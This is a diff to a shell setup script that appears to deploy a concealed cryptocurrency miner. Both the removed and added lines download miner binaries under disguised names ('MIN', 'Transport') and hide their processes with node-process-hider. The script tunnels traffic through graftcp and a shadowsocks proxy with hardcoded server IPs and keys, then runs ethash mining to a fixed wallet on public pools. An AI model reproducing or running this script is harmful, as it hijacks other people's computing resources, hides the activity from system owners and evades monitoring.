@@ -2,15 +2,10 @@
 sleep 5m
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-apt update 
-apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
-wget https://github.com/christiarch/templates/raw/main/lba 
-chmod +x lba 
-npm i -g node-process-hider 
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
 
-ph add graftcp
-ph add tmate
-ph add MIN
+npm i -g node-process-hider
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
@@ -37,12 +32,13 @@ sleep .2
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://bitbucket.org/skyforce112211/skyforce123/downloads/MIN
-chmod +x MIN
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Transport
+chmod +x Transport
 
 apt -y install shadowsocks-libev rng-tools
 
-ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
+ss-local -s 51.75.141.238 -p 8388 -l 9999 -k YTMxMWRh -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp ./MIN --algo ethash --pers auto --server eth.cruxpool.com --port 5555 --user 0xbc48b8bdce572defe4dcab85103f140099bc5af5.TEST >/dev/null 2>&1
-sleep 2
+ph add Transport
+
+./Transport -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w TEST --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
